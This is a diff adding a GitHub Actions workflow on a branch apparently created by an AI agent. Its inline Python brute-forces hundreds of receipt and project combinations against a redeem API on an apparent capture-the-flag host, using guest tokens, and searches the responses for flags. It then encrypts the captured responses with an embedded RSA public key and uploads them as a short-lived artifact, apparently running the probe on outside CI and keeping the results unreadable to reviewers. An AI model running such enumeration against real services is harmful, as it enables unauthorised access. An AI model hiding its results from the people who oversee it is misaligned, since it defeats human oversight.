@@ -1,0 +1,62 @@
+name: launchlet-part3-receipt-targeted
+on:
+  push:
+    branches: [agent/launchlet-part3-receipt-targeted-20260808]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe internal-title-derived receipts and encrypt hits
+        shell: bash
+        run: |
+          set -euo pipefail; umask 077; mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,concurrent.futures,itertools
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out');url=base+'/api/receipts/redeem'
+          h={'Content-Type':'application/json','Accept':'application/json','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
+          receipts=[
+            'lrec_enterprise_rollout_2026','lrec_enterprise_rollout_closeout_2026','lrec_enterprise_closeout_2026','lrec_rollout_closeout_2026','lrec_release_enterprise_rollout_2026','lrec_release_rollout_2026','lrec_release_closeout_2026','lrec_production_enterprise_rollout_2026','lrec_production_rollout_2026','lrec_deploy_enterprise_rollout_2026','lrec_deploy_rollout_2026','lrec_enterprise_rollout_rc3','lrec_enterprise_rollout_2026_rc3','lrec_enterprise_rollout_closeout_rc3','lrec_release_pulse_2026','lrec_production_readiness_2026','lrec_deploy_inspector_2026','lrec_corporate_release_2026','lrec_final_review_2026','lrec_enterprise_final_review_2026',
+            'drec_enterprise_rollout_2026','drec_enterprise_rollout_closeout_2026','drec_release_pulse_2026','drec_production_readiness_2026','drec_deploy_inspector_2026',
+            'rrec_enterprise_rollout_2026','rrec_enterprise_rollout_closeout_2026','rrec_release_pulse_2026','rrec_production_readiness_2026',
+            'prec_enterprise_rollout_2026','prec_release_pulse_2026','crec_enterprise_rollout_2026'
+          ]
+          projects=['launchlet-demo-board','enterprise-rollout','launchlet-enterprise-rollout','enterprise-rollout-closeout','launchlet-enterprise-rollout-closeout','Enterprise rollout closeout','enterprise','launchlet-enterprise','release-pulse','launchlet-release-pulse','production-readiness','launchlet-production-readiness','deploy-inspector','launchlet-deploy-inspector','internal','launchlet-internal','ws-launchlet-internal','corporate-release','launchlet-corporate-release']
+          tests=list(itertools.product(receipts,projects));hits=[]
+          def one(t):
+            rec,proj=t
+            try:r=requests.post(url,headers=h,json={'receipt':rec,'project':proj},timeout=6)
+            except Exception:return None
+            if r.status_code==404 and r.text in ('{"error":"receipt_not_found"}','{"error":"not_found"}'):return None
+            return {'receipt':rec,'project':proj,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+          with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
+            for x in ex.map(one,tests):
+              if x:
+                hits.append(x)
+                flags=[f for f in re.findall(r'caplag\{[^}]+\}',x.get('body','')) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+                if flags:(out/'FOUND.txt').write_text(json.dumps(x,indent=2));break
+          (out/'summary.json').write_text(json.dumps({'tested':len(tests),'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-receipt-targeted-encrypted
+          path: artifact/
+          retention-days: 1
